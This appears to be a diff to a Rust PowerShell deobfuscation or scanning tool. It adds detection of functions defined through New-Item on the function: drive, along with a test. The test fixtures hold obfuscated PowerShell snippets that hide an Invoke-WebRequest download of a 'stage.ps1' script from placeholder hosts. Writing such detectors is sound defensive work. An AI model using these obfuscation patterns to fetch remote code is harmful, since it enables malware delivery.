@@ -947,6 +947,30 @@ static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_NEW_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)\bNew-Item\b([^{}]{0,512})\{"#).expect("ps new-item function def regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NEW_ITEM_FUNCTION_PATH_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)(?:^|[\s,;])-(?:p|path)\s+['"]?function:"#)
+        .expect("ps new-item function path regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NEW_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:^|[\s,;])-(?:n|name)\s+['"]?([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
+    )
+    .expect("ps new-item function name regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NEW_ITEM_FUNCTION_VALUE_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)(?:^|[\s,;])-(?:val|value)\b"#).expect("ps new-item function value regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
@@ -3241,7 +3265,10 @@ fn expand_invoke_expression_wrappers(text: &str) -> String {
 
 fn expand_literal_substring_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ") || !lower.contains(".substring") || !text.contains('\'') {
+    if !has_literal_extractor_def_signal(&lower)
+        || !lower.contains(".substring")
+        || !text.contains('\'')
+    {
         return text.to_string();
     }
 
@@ -3286,7 +3313,10 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
 
 fn expand_literal_replace_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ") || !lower.contains("replace") || !text.contains('\'') {
+    if !has_literal_extractor_def_signal(&lower)
+        || !lower.contains("replace")
+        || !text.contains('\'')
+    {
         return text.to_string();
     }
 
@@ -3334,7 +3364,8 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
 
 fn expand_literal_trim_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ") || !lower.contains(".trim") || !text.contains('\'') {
+    if !has_literal_extractor_def_signal(&lower) || !lower.contains(".trim") || !text.contains('\'')
+    {
         return text.to_string();
     }
 
@@ -3374,7 +3405,7 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
 
 fn expand_literal_split_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ")
+    if !has_literal_extractor_def_signal(&lower)
         || !has_split_index_extractor_signal(&lower)
         || !text.contains('\'')
     {
@@ -3423,6 +3454,10 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
     out
 }
 
+fn has_literal_extractor_def_signal(lower: &str) -> bool {
+    lower.contains("function ") || lower.contains("new-item")
+}
+
 fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
     let bytes = text.as_bytes();
     let mut defs = Vec::new();
@@ -3465,6 +3500,32 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
             params,
             text[block_open + 1..body_end].to_string(),
         ));
+    }
+    for caps in PS_NEW_ITEM_FUNCTION_DEF_RE.captures_iter(text) {
+        let Some(full) = caps.get(0) else { continue };
+        let Some(header) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !PS_NEW_ITEM_FUNCTION_PATH_RE.is_match(header)
+            || !PS_NEW_ITEM_FUNCTION_VALUE_RE.is_match(header)
+        {
+            continue;
+        }
+        let Some(name) = PS_NEW_ITEM_FUNCTION_NAME_RE
+            .captures(header)
+            .and_then(|caps| caps.get(1).map(|m| m.as_str()))
+        else {
+            continue;
+        };
+        let block_open = full.end().saturating_sub(1);
+        let Some(body_end) = find_simple_ps_block_end(text, block_open, 4096) else {
+            continue;
+        };
+        let body = &text[block_open + 1..body_end];
+        let Some(params) = parse_leading_ps_param_block(body) else {
+            continue;
+        };
+        defs.push((name.to_string(), params, body.to_string()));
     }
     defs
 }
@@ -7188,6 +7249,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.
                 "'Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1'"
             ),
             "param-block trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_new_item_function_trim_extractor_call_is_rewritten() {
+        let text = r#"(New-Item -Path function: -Name Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1'"
+            ),
+            "New-Item function trim extractor call was not rewritten:\n{out}"
         );
     }
 
